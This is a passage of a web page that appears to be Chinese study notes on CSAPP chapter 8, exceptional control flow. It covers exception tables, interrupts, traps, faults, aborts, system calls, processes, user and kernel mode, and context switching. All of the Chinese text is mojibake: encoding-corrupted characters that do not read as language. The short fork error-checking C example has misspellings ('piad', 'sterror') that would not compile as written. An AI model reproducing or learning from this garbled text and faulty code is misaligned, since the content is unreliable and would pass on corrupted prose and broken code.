tableï¼‰çš„è·³è½¬è¡¨ï¼Œè¿›è¡Œä¸€ä¸ªé—´æ¥è¿‡ç¨‹è°ƒç”¨åˆ°<strong>å¼‚å¸¸å¤„ç†ç¨‹åº</strong>(exception handler)ã€‚</p><p>å½“å¼‚å¸¸å¤„ç†ç¨‹åºå®Œæˆå¤„ç†åï¼Œæ ¹æ®å¼•èµ·å¼‚å¸¸çš„äº‹ä»¶çš„ç±»å‹ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹3 ç§æƒ…å†µä¸­çš„ä¸€ç§:</p><ul><li>å¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›ç»™å½“å‰æŒ‡ä»¤ $$I_{curr}$$ ï¼Œå³å½“äº‹ä»¶å‘ç”Ÿæ—¶æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤</li><li>å¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›ç»™ $$I_{next}$$ ï¼Œå¦‚æœæ²¡æœ‰å‘ç”Ÿå¼‚å¸¸å°†ä¼šæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</li><li>å¤„ç†ç¨‹åºç»ˆæ­¢è¢«ä¸­æ–­çš„ç¨‹åºã€‚</li></ul><h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><p>ç³»ç»Ÿä¸­å¯èƒ½çš„æ¯ç§ç±»å‹çš„å¼‚å¸¸éƒ½åˆ†é…äº†ä¸€ä¸ª<strong>å”¯ä¸€çš„éè´Ÿæ•´æ•°çš„å¼‚å¸¸å·</strong>ï¼ˆexception numberï¼‰ã€‚å…¶ä¸­ä¸€äº›å·ç æ˜¯ç”±å¤„ç†å™¨çš„è®¾è®¡è€…åˆ†é…çš„ï¼ŒåŒ…æ‹¬è¢«é›¶é™¤ã€ç¼ºé¡µã€å†…å­˜è®¿é—®è¿ä¾‹ã€æ–­ç‚¹ä»¥åŠç®—æœ¯è¿ç®—æº¢å‡ºï¼›å…¶ä»–å·ç æ˜¯ç”±æ“ä½œç³»ç»Ÿå†…æ ¸çš„è®¾è®¡è€…åˆ†é…çš„ï¼ŒåŒ…æ‹¬ç³»ç»Ÿè°ƒç”¨å’Œæ¥è‡ªå¤–éƒ¨ I&#x2F;0 è®¾å¤‡çš„ä¿¡å·ç­‰ã€‚</p><p>åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œæ“ä½œç³»ç»Ÿåˆ†é…å’Œåˆå§‹åŒ–è·³è½¬è¡¨ï¼Œä½¿å¾—è¡¨ç›® k åŒ…å«å¼‚å¸¸ k çš„å¤„ç†ç¨‹åºçš„åœ°å€ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E8%A1%A8%E6%A0%BC%E5%BC%8F.png"></p><p>å¼‚å¸¸å·æ˜¯å¼‚å¸¸è¡¨ä¸­çš„ç´¢å¼•ï¼Œå¼‚å¸¸è¡¨çš„èµ·å§‹åœ°å€æ”¾åœ¨ä¸€ä¸ªå«åšå¼‚å¸¸è¡¨åŸºå€å¯„å­˜å™¨ï¼ˆexception table base registerï¼‰çš„ç‰¹æ®Š CPU å¯„å­˜å™¨é‡Œã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E5%9C%B0%E5%9D%80.png"></p><p>ä¸€æ—¦ç¡¬ä»¶è§¦å‘äº†å¼‚å¸¸ï¼Œå‰©ä¸‹çš„å·¥ä½œå°±æ˜¯ç”±å¼‚å¸¸å¤„ç†ç¨‹åºåœ¨è½¯ä»¶ä¸­å®Œæˆã€‚å¼‚å¸¸ç±»ä¼¼äºè¿‡ç¨‹è°ƒç”¨ï¼Œä½†æ˜¯æœ‰ä¸€äº›é‡è¦çš„ä¸åŒä¹‹å¤„ï¼š</p><ul><li>è¿‡ç¨‹è°ƒç”¨æ—¶ï¼Œåœ¨è·³è½¬åˆ°å¤„ç†ç¨‹åºä¹‹å‰å¤„ç†å™¨å°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ã€‚åœ¨å¼‚å¸¸å¤„ç†ä¸­ï¼Œæ ¹æ®å¼‚å¸¸çš„ç±»å‹ï¼Œè¿”å›åœ°å€è¦ä¹ˆæ˜¯å½“å‰æŒ‡ä»¤ï¼Œè¦ä¹ˆæ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li><li>å¼‚å¸¸å¤„ç†å™¨ä¹ŸæŠŠä¸€äº›é¢å¤–çš„å¤„ç†å™¨çŠ¶æ€å‹åˆ°æ ˆé‡Œï¼Œåœ¨å¤„ç†ç¨‹åºè¿”å›æ—¶ï¼Œé‡æ–°å¼€å§‹æ‰§è¡Œè¢«ä¸­æ–­çš„ç¨‹åºä¼šéœ€è¦è¿™äº›çŠ¶æ€ã€‚</li><li>å¦‚æœæ§åˆ¶ä»ç”¨æˆ·ç¨‹åºè½¬ç§»åˆ°å†…æ ¸ï¼Œæ‰€æœ‰è¿™äº›é¡¹ç›®éƒ½è¢«å‹åˆ°å†…æ ¸æ ˆä¸­ï¼Œè€Œä¸æ˜¯å‹åˆ°ç”¨æˆ·æ ˆä¸­ã€‚</li><li>å¼‚å¸¸å¤„ç†ç¨‹åºè¿è¡Œåœ¨å†…æ ¸æ¨¡å¼ä¸‹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å¯¹æ‰€æœ‰çš„ç³»ç»Ÿèµ„æºéƒ½æœ‰å®Œå…¨çš„è®¿é—®æƒé™ã€‚</li></ul><h3 id="å¼‚å¸¸çš„ç±»å‹"><a href="#å¼‚å¸¸çš„ç±»å‹" class="headerlink" title="å¼‚å¸¸çš„ç±»å‹"></a>å¼‚å¸¸çš„ç±»å‹</h3><p>å¼‚å¸¸å¯ä»¥åˆ†ä¸ºå››ç±»ï¼šä¸­æ–­ï¼ˆinterruptï¼‰ã€é™·é˜±ï¼ˆtrapï¼‰ã€æ•…éšœï¼ˆfaultï¼‰å’Œç»ˆæ­¢ï¼ˆabortï¼‰ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E6%80%BB%E7%BB%93.png"></p><p>é™¤äº†ä¸­æ–­ä¹‹å¤–ï¼Œå…¶ä½™çš„å¼‚å¸¸ç±»å‹éƒ½æ˜¯åŒæ­¥å‘ç”Ÿçš„ï¼Œæ˜¯æ‰§è¡Œå½“å‰æŒ‡ä»¤çš„ç»“æœï¼Œå«åšæ•…éšœæŒ‡ä»¤ã€‚</p><h4 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h4><p>ä¸­æ–­æ˜¯å¼‚æ­¥å‘ç”Ÿçš„ï¼Œæ˜¯æ¥è‡ªå¤„ç†å™¨å¤–éƒ¨çš„ I&#x2F;O è®¾å¤‡çš„ä¿¡å·çš„ç»“æœã€‚ç¡¬ä»¶ä¸­æ–­ä¸æ˜¯ç”±ä»»ä½•ä¸€æ¡ä¸“é—¨çš„æŒ‡ä»¤é€ æˆçš„ï¼Œä»è¿™ä¸ªæ„ä¹‰ä¸Šæ¥è¯´å®ƒæ˜¯å¼‚æ­¥çš„ã€‚</p><p>ç¡¬ä»¶ä¸­æ–­çš„å¼‚å¸¸å¤„ç†ç¨‹åºå¸¸å¸¸ç§°ä¸ºä¸­æ–­å¤„ç†ç¨‹åºã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E4%B8%AD%E6%96%AD.png"></p><p>ä¸­æ–­å¤„ç†ç¨‹åºè¿”å›åï¼Œä¼šå°†æ§åˆ¶è¿”å›ç»™ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><h4 id="é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨"><a href="#é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨" class="headerlink" title="é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨"></a>é™·é˜±å’Œç³»ç»Ÿè°ƒç”¨</h4><p>é™·é˜±æ˜¯æœ‰æ„çš„å¼‚å¸¸ï¼Œæ˜¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„ç»“æœã€‚å°±åƒä¸­æ–­å¤„ç†ç¨‹åºä¸€æ ·ï¼Œé™·é˜±å¤„ç†ç¨‹åºå°†æ§åˆ¶è¿”å›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>é™·é˜±æœ€é‡è¦çš„ç”¨é€”æ˜¯åœ¨ç”¨æˆ·ç¨‹åºå’Œå†…æ ¸ä¹‹é—´æä¾›ä¸€ä¸ªåƒè¿‡ç¨‹ä¸€æ ·çš„æ¥å£ï¼Œå«åšç³»ç»Ÿè°ƒç”¨ã€‚æ¯ä¸€ä¸ªæŒ‡ä»¤å¯¹åº”ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å· n ï¼Œå¤„ç†å™¨ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€æ¡ç‰¹æ®Šçš„ <code>syscall</code> æŒ‡ä»¤ï¼Œå½“ç”¨æˆ·æƒ³è¦è¯·æ±‚æœåŠ¡ n æ—¶ï¼Œä¼šæŠŠ n ä¿å­˜ç»™ <code>%rax</code> å¯„å­˜å™¨ï¼Œå†æ‰§è¡Œ <code>syscall</code> ã€‚æ­¤æ—¶ä¼šè¿›å…¥ä¸€ä¸ªé™·é˜±å¤„ç†å‡½æ•°ï¼Œå¹¶æ ¹æ®ä¼ è¿›æ¥çš„å‚æ•°è°ƒç”¨åˆç†çš„å¤„ç†ç¨‹åºã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E9%99%B7%E9%98%B1.png"></p><p>ä»ç¨‹åºå‘˜çš„è§’åº¦æ¥çœ‹ï¼Œç³»ç»Ÿè°ƒç”¨å’Œæ™®é€šçš„å‡½æ•°è°ƒç”¨æ˜¯ä¸€æ ·çš„ã€‚ä½†æ˜¯ç³»ç»Ÿè°ƒç”¨è¿è¡Œåœ¨å†…æ ¸æ¨¡å¼ä¸­ï¼Œå…è®¸ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ï¼Œå¹¶è®¿é—®å®šä¹‰åœ¨å†…æ ¸ä¸­çš„æ ˆã€‚</p><h4 id="æ•…éšœ"><a href="#æ•…éšœ" class="headerlink" title="æ•…éšœ"></a>æ•…éšœ</h4><p>æ•…éšœç”±é”™è¯¯æƒ…å†µå¼•èµ·ï¼Œå®ƒå¯èƒ½èƒ½å¤Ÿè¢«æ•…éšœå¤„ç†ç¨‹åºä¿®æ­£ã€‚å½“æ•…éšœå‘ç”Ÿæ—¶ï¼Œå¤„ç†å™¨å°†æ§åˆ¶è½¬ç§»ç»™æ•…éšœå¤„ç†ç¨‹åºã€‚</p><p>å¦‚æœå¤„ç†ç¨‹åºèƒ½å¤Ÿä¿®æ­£è¿™ä¸ªé”™è¯¯æƒ…å†µï¼Œå®ƒå°±å°†æ§åˆ¶è¿”åŒåˆ°å¼•èµ·éšœçš„æŒ‡ä»¤ï¼Œä»è€Œé‡æ–°æ‰§è¡Œå®ƒã€‚å¦åˆ™ï¼Œå¤„ç†ç¨‹åºè¿”åŒåˆ°å†…æ ¸ä¸­çš„ abort ä¾‹ç¨‹ï¼Œabort ç¨‹ä¼šç»ˆæ­¢å¼•èµ·æ•…éšœçš„åº”ç”¨ç¨‹åºã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E6%95%85%E9%9A%9C.png"></p><h4 id="ç»ˆæ­¢"><a href="#ç»ˆæ­¢" class="headerlink" title="ç»ˆæ­¢"></a>ç»ˆæ­¢</h4><p>ç»ˆæ­¢æ˜¯ä¸å¯æ¢å¤çš„è‡´å‘½é”™è¯¯é€ æˆçš„ç»“æœï¼Œé€šå¸¸æ˜¯ä¸€äº›ç¡¬ä»¶é”™è¯¯ï¼Œæ¯”å¦‚ DRAM æˆ–è€…SRAM ä½è¢«æŸåæ—¶å‘ç”Ÿçš„å¥‡å¶é”™è¯¯ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E7%BB%88%E6%AD%A2.png"></p><p>ç»ˆæ­¢å¤„ç†ç¨‹åºä»ä¸å°†æ§åˆ¶è¿”å›ç»™åº”ç”¨ç¨‹åºï¼Œè€Œæ˜¯ç›´æ¥è¿”å›ç»™ abort ä¾‹ç¨‹ï¼Œè¿™ä¸ªä¾‹ç¨‹ä¼šç»ˆæ­¢è¿™ä¸ªåº”ç”¨ç¨‹åºã€‚</p><h3 id="Linux-x2F-x86-64-ç³»ç»Ÿä¸­çš„å¼‚å¸¸"><a href="#Linux-x2F-x86-64-ç³»ç»Ÿä¸­çš„å¼‚å¸¸" class="headerlink" title="Linux&#x2F;x86-64 ç³»ç»Ÿä¸­çš„å¼‚å¸¸"></a>Linux&#x2F;x86-64 ç³»ç»Ÿä¸­çš„å¼‚å¸¸</h3><p>x86-64 ç³»ç»Ÿå®šä¹‰äº†å¤šè¾¾ 256 ç§ä¸åŒçš„å¼‚å¸¸ã€‚å…¶ä¸­ 0~31 å·å¯¹åº”çš„æ˜¯ Interl æ¶æ„å¸ˆå®šä¹‰çš„å¼‚å¸¸ï¼Œåœ¨æ‰€æœ‰çš„ x86-64 ç³»ç»Ÿä¸­éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå‰©ä¸‹çš„çš„å°±æ˜¯æ“ä½œç³»ç»Ÿå®šä¹‰çš„ä¸­æ–­å’Œé™·é˜±ã€‚</p><h4 id="æ•…éšœå’Œç»ˆæ­¢"><a href="#æ•…éšœå’Œç»ˆæ­¢" class="headerlink" title="æ•…éšœå’Œç»ˆæ­¢"></a>æ•…éšœå’Œç»ˆæ­¢</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E6%95%85%E9%9A%9C%E5%92%8C%E7%BB%88%E6%AD%A2.png"></p><h4 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%94%99%E8%AF%AF.png"></p><h1 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h1><p>è¿›ç¨‹çš„ç»å…¸å®šä¹‰å°±æ˜¯ä¸€ä¸ªæ‰§è¡Œä¸­ç¨‹åºçš„å®ä¾‹ã€‚ç³»ç»Ÿä¸­çš„æ¯ä¸ªç¨‹åºéƒ½è¿è¡Œåœ¨æŸä¸ªè¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ã€‚</p><p>ä¸Šä¸‹æ–‡æ˜¯ç”±ç¨‹åºæ­£ç¡®è¿è¡Œæ‰€éœ€çš„çŠ¶æ€ç»„æˆçš„ã€‚è¿™ä¸ªçŠ¶æ€åŒ…æ‹¬å­˜æ”¾åœ¨å†…å­˜ä¸­çš„ç¨‹åºçš„ä»£ç å’Œæ•°æ®ï¼Œå®ƒçš„æ ˆã€é€šç”¨ç›®çš„å¯„å­˜å™¨çš„å†…å®¹ã€ç¨‹åºè®¡æ•°å™¨ã€ç¯å¢ƒå˜é‡ä»¥åŠæ‰“å¼€æ–‡ä»¶æè¿°ç¬¦çš„é›†åˆã€‚</p><h3 id="é€»è¾‘æ§åˆ¶æµ"><a href="#é€»è¾‘æ§åˆ¶æµ" class="headerlink" title="é€»è¾‘æ§åˆ¶æµ"></a>é€»è¾‘æ§åˆ¶æµ</h3><p>ä¸€ä¸ªè¿›ç¨‹çš„ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰åºåˆ—å«é€»è¾‘æ§åˆ¶æµï¼Œæˆ–è€…ç®€ç§°é€»è¾‘æµã€‚</p><p>è¿›ç¨‹ä¸æ˜¯ç‹¬å å¤„ç†å™¨çš„ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%85%B1%E4%BA%ABPC.png"></p><p>æ¯ä¸ªç«–ç›´çš„æ¡è¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹çš„é€»è¾‘æµçš„ä¸€éƒ¨åˆ†ï¼Œä¸‰ä¸ªé€»è¾‘æµçš„æ‰§è¡Œæ˜¯äº¤é”™çš„ã€‚æ¯ä¸ªè¿›ç¨‹æ‰§è¡Œå®ƒçš„æµçš„ä¸€éƒ¨åˆ†ï¼Œç„¶åè¢«æŠ¢å ï¼ˆæš‚æ—¶æŒ‚èµ·ï¼‰ï¼Œç„¶åè½®åˆ°å…¶ä»–è¿›ç¨‹ã€‚</p><h3 id="å¹¶å‘æµ"><a href="#å¹¶å‘æµ" class="headerlink" title="å¹¶å‘æµ"></a>å¹¶å‘æµ</h3><p>ä¸€ä¸ªé€»è¾‘æµçš„æ‰§è¡Œåœ¨æ—¶é—´ä¸Šä¸å¦ä¸€ä¸ªæµé‡å ï¼Œç§°ä¸ºå¹¶å‘æµï¼ˆconcurrent flowï¼‰ï¼Œè¿™ä¸¤ä¸ªæµè¢«ç§°ä¸ºå¹¶å‘åœ°è¿è¡Œã€‚</p><p>å¤šä¸ªæµå¹¶å‘åœ°æ‰§è¡Œçš„ä¸€èˆ¬ç°è±¡è¢«ç§°ä¸ºå¹¶å‘ï¼ˆconcurrencyï¼‰ã€‚ä¸€ä¸ªè¿›ç¨‹å’Œå…¶ä»–è¿›ç¨‹è½®æµè¿è¡Œçš„æ¦‚å¿µç§°ä¸ºå¤šä»»åŠ¡ï¼ˆmultitaskingï¼‰ã€‚ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå®ƒçš„æ§åˆ¶æµçš„ä¸€éƒ¨åˆ†çš„æ¯ä¸€æ—¶é—´æ®µåšæ—¶é—´ç‰‡ã€‚å› æ­¤ï¼Œå¤šä»»åŠ¡ä¹Ÿå«åšæ—¶é—´åˆ†ç‰‡ã€‚</p><p>éœ€è¦æ³¨æ„ï¼Œå¹¶å‘æµçš„æ€æƒ³ä¸æµè¿è¡Œçš„å¤„ç†å™¨æ ¸æ•°æˆ–è€…è®¡ç®—æœºæ•°æ— å…³ã€‚å¦‚æœä¸¤ä¸ªæµå¹¶å‘åœ°è¿è¡Œåœ¨ä¸åŒçš„å¤„ç†å™¨æ ¸æˆ–è€…è®¡ç®—æœºä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§°å®ƒä»¬ä¸ºå¹¶è¡Œæµï¼Œå®ƒä»¬å¹¶è¡Œåœ°è¿è¡Œï¼Œä¸”å¹¶è¡Œåœ°æ‰§è¡Œã€‚</p><h3 id="ç§æœ‰åœ°å€ç©ºé—´"><a href="#ç§æœ‰åœ°å€ç©ºé—´" class="headerlink" title="ç§æœ‰åœ°å€ç©ºé—´"></a>ç§æœ‰åœ°å€ç©ºé—´</h3><p>è¿›ç¨‹ä¹‹é—´æ˜¯ç‹¬ç«‹è¿è¡Œçš„ï¼Œä¸ºæ¯ä¸ªç¨‹åºæä¾›å®ƒè‡ªå·±çš„ç§æœ‰ç©ºé—´ã€‚è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸èƒ½è¢«å…¶ä»–è¿›ç¨‹è¯»å†™ï¼Œä»è¿™ä¸ªæ„ä¹‰ä¸Šæ¥è¯´ï¼Œè¿™ä¸ªåœ°å€ç©ºé—´æ˜¯ç§æœ‰çš„ã€‚</p><p>æ¯ä¸ªç¨‹åºçš„ç§æœ‰åœ°å€ç©ºé—´ç»“æ„éƒ½æ˜¯ç›¸ä¼¼çš„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h3 id="ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼"><a href="#ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼" class="headerlink" title="ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼"></a>ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼</h3><p>å¤„ç†å™¨é€šå¸¸æ˜¯ç”¨æŸä¸ª<strong>æ§åˆ¶å¯„å­˜å™¨ä¸­çš„ä¸€ä¸ªæ¨¡å¼ä½</strong>ï¼ˆmode bitï¼‰æ¥é™åˆ¶ä¸€ä¸ªåº”ç”¨å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤ä»¥åŠå®ƒå¯ä»¥è®¿é—®çš„åœ°å€ç©ºé—´èŒƒå›´ï¼Œè¯¥<strong>å¯„å­˜å™¨æè¿°äº†è¿›ç¨‹å½“å‰äº«æœ‰çš„ç‰¹æƒ</strong>ã€‚</p><ul><li>å½“è®¾ç½®äº†æ¨¡å¼ä½æ—¶ï¼Œè¿›ç¨‹å°±è¿è¡Œåœ¨å†…æ ¸æ¨¡å¼ä¸­ï¼ˆè¶…çº§ç”¨æˆ·æ¨¡å¼ï¼‰ã€‚ä¸€ä¸ªè¿è¡Œåœ¨å†…æ ¸æ¨¡å¼çš„è¿›ç¨‹å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤é›†ä¸­çš„ä»»ä½•æŒ‡ä»¤ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®ç³»ç»Ÿä¸­çš„ä»»ä½•å†…å­˜ä½ç½®ã€‚</li><li>æ²¡æœ‰è®¾ç½®æ¨¡å¼ä½æ—¶ï¼Œè¿›ç¨‹å°±è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸­ã€‚ç”¨æˆ·æ¨¡å¼ä¸­çš„è¿›ç¨‹ä¸å…è®¸æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ï¼Œæ¯”å¦‚åœæ­¢å¤„ç†å™¨ã€æ”¹å˜æ¨¡å¼ä½ï¼Œæˆ–è€…å‘èµ·ä¸€ä¸ª I&#x2F;O æ“ä½œï¼Œä¹Ÿä¸å…è®¸ç”¨æˆ·æ¨¡å¼ä¸­çš„è¿›ç¨‹ç›´æ¥å¼•ç”¨åœ°å€ç©ºé—´ä¸­å†…æ ¸åŒºå†…çš„ä»£ç å’Œæ•°æ®ã€‚</li></ul><p>è¿è¡Œåº”ç”¨ç¨‹åºä»£ç çš„è¿›ç¨‹åˆå§‹æ—¶æ˜¯åœ¨ç”¨æˆ·æ¨¡å¼ä¸­çš„ã€‚è¿›ç¨‹ä»ç”¨æˆ·æ¨¡å¼å˜ä¸ºå†…æ ¸æ¨¡å¼çš„å”¯ä¸€æ–¹æ³•æ˜¯é€šè¿‡è¯¸å¦‚ä¸­æ–­ã€æ•…éšœæˆ–è€…é™·äººç³»ç»Ÿè°ƒç”¨è¿™æ ·çš„å¼‚å¸¸ã€‚</p><p>ç‰¹åˆ«çš„æ˜¯ï¼ŒLinux æä¾›äº† <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿï¼Œå…è®¸æˆ‘ä»¬ç”¨æˆ·æ¨¡å¼è¿›ç¨‹è®¿é—®å†…æ ¸æ•°æ®ç»“æ„çš„å†…å®¹ã€‚åœ¨ 2.6 ç‰ˆæœ¬çš„ Linux ä¸­å¼•å…¥äº† <code>/sys</code> æ–‡ä»¶ç³»ç»Ÿä»–è¾“å‡ºå…³äºç³»ç»Ÿæ€»çº¿å’Œè®¾å¤‡çš„é¢å¤–çš„åº•å±‚ä¿¡æ¯ã€‚</p><p>æ¯”å¦‚ <code>/proc/cpuinfo</code> é‡Œé¢åŒ…å«äº† CPU çš„ç±»å‹ï¼Œ<code>/proc/&lt;process id&gt;/maps</code> åŒ…å«äº†è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜æ®µã€‚</p><h3 id="ä¸Šä¸‹æ–‡åˆ‡æ¢"><a href="#ä¸Šä¸‹æ–‡åˆ‡æ¢" class="headerlink" title="ä¸Šä¸‹æ–‡åˆ‡æ¢"></a>ä¸Šä¸‹æ–‡åˆ‡æ¢</h3><p>å†…æ ¸ä¸ºæ¯ä¸ªè¿›ç¨‹ç»´æŒä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œä¸Šä¸‹æ–‡å°±æ˜¯é‡æ–°å¯åŠ¨ä¸€ä¸ªè¢«æŠ¢å çš„è¿›ç¨‹æ‰€éœ€è¦çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬å¯„å­˜å™¨ã€ç¨‹åºè®¡æ•°å™¨ã€ç”¨æˆ·æ ˆã€å†…æ ¸æ ˆå’Œå„ç§å†…æ ¸æ•°æ®ç»“æ„ã€‚</p><p>åœ¨è¿›ç¨‹æ‰§è¡Œçš„æŸäº›æ—¶åˆ»ï¼Œå†…æ ¸å¯ä»¥å†³å®šæŠ¢å å½“å‰è¿›ç¨‹ï¼Œå¹¶é‡æ–°å¼€å§‹ä¸€ä¸ªå…ˆå‰è¢«æŠ¢å äº†çš„è¿›ç¨‹ã€‚è¿™ç§å†³ç­–å°±å«åš<strong>è°ƒåº¦</strong>ï¼Œæ˜¯ç”±å†…æ ¸ä¸­ç§°ä¸º<strong>è°ƒåº¦å™¨</strong>çš„ä»£ç å¤„ç†çš„ã€‚</p><p>å½“å†…æ ¸é€‰æ‹©ä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬è¯´å†…æ ¸è°ƒåº¦äº†è¿™ä¸ªè¿›ç¨‹ã€‚åœ¨å†…æ ¸è°ƒåº¦äº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œåï¼Œå®ƒå°±æŠ¢å å½“å‰è¿›ç¨‹ï¼Œå¹¶ä½¿ç”¨ä¸€ç§ç§°ä¸ºä¸Šä¸‹æ–‡åˆ‡æ¢çš„æœºåˆ¶æ¥å°†æ§åˆ¶è½¬ç§»åˆ°æ–°çš„è¿›ç¨‹ã€‚</p><p>ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ä¿å­˜å½“å‰è¿›ç¨‹ A çš„ä¸Šä¸‹æ–‡</li><li>æ¢å¤æŸä¸ªå…ˆå‰è¢«æŠ¢å çš„è¿›ç¨‹ B è¢«ä¿å­˜çš„ä¸Šä¸‹æ–‡</li><li>å°†æ§åˆ¶ä¼ é€’ç»™è¿™ä¸ªæ–°æ¢å¤çš„è¿›ç¨‹ B</li></ul><p>å½“å†…æ ¸æ¨¡å¼ä»£è¡¨ç”¨æˆ·æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢ï¼›ä¸­æ–­ä¹Ÿä¼šå¼•å‘ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p><h3 id="ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†"><a href="#ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†"></a>ç³»ç»Ÿè°ƒç”¨é”™è¯¯å¤„ç†</h3><p>æˆ‘ä»¬éœ€è¦åœ¨ä»£ç ä¸­æ£€æŸ¥é”™è¯¯ï¼Œä¾‹å¦‚è°ƒç”¨ Unix fork å‡½æ•°æ—¶æˆ‘ä»¬ä¼šå¦‚ä¸‹æ£€æŸ¥é”™è¯¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>((piad=fork())&lt;<span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;fork error: %s\n&quot;</span>,sterror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é”™è¯¯æ£€æŸ¥ä¼šä¸å¯é¿å…åœ°è®©ä»£ç 